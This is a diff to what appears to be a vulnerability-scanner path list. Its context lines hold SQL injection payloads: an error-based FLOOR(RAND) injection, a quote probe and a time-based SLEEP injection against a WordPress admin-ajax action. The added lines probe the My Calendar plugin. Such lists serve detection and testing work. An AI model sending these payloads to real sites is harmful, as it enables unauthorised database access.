@@ -125,3 +125,5 @@
 /admin/cms_channel.php?del=123456+AND+(SELECT+1+FROM(SELECT+COUNT(*)%2cCONCAT(0x7e%2cmd5({{num}})%2c0x7e%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x)a)--%2b
 /mainpage/msglog.aspx?user=1%27
 /wp-admin/admin-ajax.php?action=ls_get_popup_markup&id[where]=1)and (SELECT 6416 FROM (SELECT(SLEEP(6)))nEiK)-- vqlq
+/wp-content/plugins/my-calendar/readme.txt
+/?rest_route=/my-calendar/v1/events&from=1
